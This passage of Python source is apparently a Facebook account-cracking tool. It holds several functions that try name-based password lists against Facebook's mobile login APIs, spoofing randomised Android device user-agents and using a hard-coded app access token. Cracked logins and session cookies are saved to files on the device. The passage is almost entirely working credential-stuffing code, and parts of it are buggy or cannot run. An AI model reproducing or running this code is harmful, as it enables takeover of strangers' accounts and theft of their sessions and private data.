','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
				ENB = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/ONO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]'
				uax = f'Dalvik/2.1.0 (Linux; U; Android '+vk+'; HTC Desire 520 Build/QP1A.'+gn+'.'+gm+') '+ENH
				model3 = random.choice(['SM-G920F|NRD90M','SM-T535|LRX22G','SM-T231|KOT49H','SM-J320F|LMY47V','GT-I9190|KOT49H','GT-N7100|KOT49H','SM-T561|KTU84P','GT-I9500|LRX22C','SM-G930F|NRD90M','SM-J510FN|NMF26X','GT-P5100|IML74Kr','GT-N8000|JZO54K','SM-T531|LRX22G','SPH-L720|KOT49H','GT-I9500|JDQ39','SM-G935F|NRD90M','SM-T531|KOT49H','SM-J320FN|LMY47V','SM-A500F|MMB29M','SM-A500FU|MMB29Mr','SM-T311|KOT49H','GT-P5210|KOT49H','SM-T230|KOT49H','GT-I9192|KOT49H','SM-T235|KOT49H','SM-A500F|LRX22G','SM-G920F|MMB29K','SM-A500H|MMB29M','GT-I9300|JSS15J','SM-J320F|LMY4r','GT-N8000|KOT49H','SM-G900F|KOT49H','GT-S7390|JZO54K','GT-P5100|JZO54K','SM-J510FN|MMB29Mr','GT-P5110|JDQ39','GT-I9301I|KOT49H','SM-T311|KOT4','GT-P5200|KOT49H','SM-J320M|LMY47V','SM-T820|NRD90M','SM-G935F|MMB29K','SM-J701F|NRD90M','GT-I9301I|KOT49H','SM-T111|JDQ39','SM-J510FN|NMF2','SM-T705|LRX22G','GT-N5100|JZO54K','GT-I9300I|KTU84P','GT-P5100|JDQ39','SM-T805|LRX22G','SM-J320H|LMY47V','SM-T310|KOT49H','SM-T705|LRX22G','GT-P3110|JZO54K','GT-I9300|IMM76D','SM-G950F|NRD90M','SM-J510FN|NMF26X','SM-J701F|NRD90M','SM-T315|JDQ39','GT-P5220|JDQ39','SM-T525|KOT49H','SM-T555|LRX22G'])
				#ua_string = 'Dalvik/2.1.0 (Linux; U; Android 5.1; GT-I8262 Build/LMY47I) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/en_GB;FBCR/AirTel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I8262;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
				device_family_id = str(uuid.uuid4())
				adid = str(uuid.uuid4())
				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
				data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_US',
				'client_country_code':'US',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':uln,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
				url = 'https://b-api.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;34m [NOYON-LIVE] \033[1;32m'+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\033[1;34m [NOYON-LOCK] \x1b[38;5;205m'+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)
		except Exception as e:
			pass
#m2
#b-graph method		
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;34m [NOYON-M2] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        models = ['SM-G920F|NRD90M','SM-T535|LRX22G','SM-T231|KOT49H','SM-J320F|LMY47V','GT-I9190|KOT49H','GT-N7100|KOT49H','SM-T561|KTU84P','GT-I9500|LRX22C','SM-G930F|NRD90M','SM-J510FN|NMF26X','GT-P5100|IML74Kr','GT-N8000|JZO54K','SM-T531|LRX22G','SPH-L720|KOT49H','GT-I9500|JDQ39','SM-G935F|NRD90M','SM-T531|KOT49H','SM-J320FN|LMY47V','SM-A500F|MMB29M','SM-A500FU|MMB29Mr','SM-T311|KOT49H','GT-P5210|KOT49H','SM-T230|KOT49H','GT-I9192|KOT49H','SM-T235|KOT49H','SM-A500F|LRX22G','SM-G920F|MMB29K','SM-A500H|MMB29M','GT-I9300|JSS15J','SM-J320F|LMY4r','GT-N8000|KOT49H','SM-G900F|KOT49H','GT-S7390|JZO54K','GT-P5100|JZO54K','SM-J510FN|MMB29Mr','GT-P5110|JDQ39','GT-I9301I|KOT49H','SM-T311|KOT4','GT-P5200|KOT49H','SM-J320M|LMY47V','SM-T820|NRD90M','SM-G935F|MMB29K','SM-J701F|NRD90M','GT-I9301I|KOT49H','SM-T111|JDQ39','SM-J510FN|NMF2','SM-T705|LRX22G','GT-N5100|JZO54K','GT-I9300I|KTU84P','GT-P5100|JDQ39','SM-T805|LRX22G','SM-J320H|LMY47V','SM-T310|KOT49H','SM-T705|LRX22G','GT-P3110|JZO54K','GT-I9300|IMM76D','SM-G950F|NRD90M','SM-J510FN|NMF26X','SM-J701F|NRD90M','SM-T315|JDQ39','GT-P5220|JDQ39','SM-T525|KOT49H','SM-T555|LRX22G']
                        model_,build = random.choice(self.models).rsplit('|')
                        android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        facebook_version = f"{random.randint(100, 200)}.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
                        fbbv = str(random.randint(10000000, 99999999))
                        fbrv = str(random.randint(10000000, 99999999))
                        fbsv = f"{random.uniform(4.0, 13.0):.1f}"
                        density = f"{random.uniform(1.0, 4.0):.1f}"
                        width = random.randint(720, 1440)
                        height = random.randint(1280, 2560)
                        network_carriers = ["Airtel", "null", "Uphone", "banglalink"]
                        network_carrier = random.choice(network_carriers)
                        network_type = random.choice(["WiFi", "4G", "3G"])
                        ip_address = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
                        fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite", "com.facebook.adsmanager", "com.facebook.mlite"])
                        fbbd = 'Samsung'
                        en = random.choice(['en_US', 'en_GB', 'fr_FR', 'es_US', 'es_ES', 'it_IT', 'id_ID'])
                        ENJ = f"[FBAN/"+fban+";FBAV/"+facebook_version+";FBBV/"+fbbv+";FBDM/{density="+density+",width="+width+",height="+height+"};FBLC/"+en+";FBRV/"+fbrv+";FBCR/"+fbcr+";FBMF/"+model_+";FBBD/"+fbbd+";FBPN/"+fbpn+";FBDV/"+model_.replace(' ', '_')+";FBSV/"+fbsv+";FBOP/1;FBCA/x86:armeabi-v7a;FBNT/"+network_type+";FBCN/"+network_carrier+";FBSR/"+ip_address+";]"
                        user_agent = f"Dalvik/2.1.0 (Linux; U; "+android_version+"; "+model_+" Build/"+build+") "+ENJ
                        
                        gttt = random.choice(['G900F','G950F','G1000F','G1050F','G1100F','G1150F','G1200F','G1250F','G1300F','G1350F','G1400F','G1450F','G1500F','G1550F','G1600F','G1650F','G1700F','G1750F','G1800F','A115F','A120F','A150F','A200F','A115G','A900G','A950G','A950F','A1000F','A1050F','A1100F','A1150F','A1200F','A250F','A300F','A350F','A400F','A450F','G115F','G200F','G250F','G300F','G532G','G533G'])
                        usee = random.choice(['[FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};]','[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]','[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/412.0.0.22.115;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','[FBAN/FB4A;FBAV/315.0.0.47.113;FBPN/com.facebook.katana;FBLC/en_US;FBBV/285966838;FBCR/Android;FBMF/Genymotion;FBBD/Android;FBDV/Xiaomi Redmi Note 7;FBSV/9;FBCA/x86:null;FBDM/{density=2.625,width=1080,height=2214};FB_FW/1;FBRV/287051585;]','[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": user_agent,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
  #method3             
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;34m [NOYON-FILE] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'                       
                        models = random.choice(['SM-G920F','SM-T535','SM-T231','SM-J320F','GT-I9190','GT-N7100','SM-T561','GT-I9500','SM-G930F','SM-J510FN','GT-P5100','GT-N8000','SM-T531','SPH-L720','GT-I9500','SM-G935F','SM-T531','SM-J320FN','SM-A500F','SM-A500FU','SM-T311','GT-P5210','SM-T230','GT-I9192','SM-T235','SM-A500F','SM-G920F','SM-A500H','GT-I9300','SM-J320F','GT-N8000|/','SM-G900F','GT-S7390','GT-P5100','SM-J510FN','GT-P5110','GT-I9301I','SM-T311','GT-P5200','SM-J320M','SM-T820','SM-G935F','SM-J701F','GT-I9301I','SM-T111|JDQ39','SM-J510FN','SM-T705','GT-N5100','GT-I9300I','GT-P5100','SM-T805','SM-J320H','SM-T310','SM-T705','GT-P3110','GT-I9300','SM-G950F','SM-J510FN','SM-J701F','SM-T315','GT-P5220','SM-T525','SM-T555'])
                        fbrr = str(random.randint(111111111,999999999))
                        fbkbb = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
                        #[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1532,height=2560};FBLC/de_DE;FBCR/Telekom.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N915FY;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]
                        vs1 = str(random.randint(111,333))
                        vs2 = str(random.randint(33,55))
                        vs3 = str(random.randint(111,222))
                        ENB = random.choice(['[FBAN/FB4A;FBAV/'+vs1+'.0.0.'+vs2+'.'+vs3+';FBPN/'+fbkbb+';FBLC/en_US;FBBV/'+fbbv+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+models+';FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/'+fbrr+';]','[FBAN/FB4A;FBAV/'+vs1+'.0.0.'+vs2+'.'+vs3+';FBPN/'+fbkbb+';FBLC/en_US;FBBV/'+fbbv+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+models+';FBSV/samsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]'])
                        uas = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; '+models+' Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+ENB
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        model2 = random.choice(['G800Y','G920F','T535','G850Y','G900Y','T231','G950Y','J320F','G1050Y','G1100Y','G1150Y','G1200Y','G1250Y','G1300Y','G1350Y','T561','G1400Y','G1700Y','G1750Y','G150Y','G930F','G1800Y','J510FN','G1850Y','G1900Y','G532Y','G532G','G532','G533','T531','G550','J532','J532Y','G532Y','A1200F','A1250F','A1300F','A1350F','G935F','G1835','A1400F','A1700F','J320FN','A1750F','A1800F','A500F','A1850F','A1900F','A500FU','A1950F','T311','A1200FU','A1250FU','A1400FU','A1450FU','A1700FU','A1750FU','A1800FU','A1850FU','A1900FU','A2150F','G2150G','A500FU','T311','J320M','T820','J510FN'])
                        #END = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-'+model2+';FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
                        #usb = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-'+model2+' Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": uas,
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;34m [NOYON-OK] \033[1;32m'+ids+' | '+pas+'\033[1;97m')
                                        #coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("Cookie: "+coki)
                                        open('/sdcard/TRT-ua.txt','a').write(uas+'\n')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NOYON-2F] \x1b[38;5;205m'+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m [NOYON-CP] \033[1;31m'+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#b-api method
#method3                
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android 7; SM-G1150F Build/QP1A.411900.502) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1150F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android 9.0.1; Nokia Build/QP1A.792171.342) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A950G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A950G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G900Y Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G900Y;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1150F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1150F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1800F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1800F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G533G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) 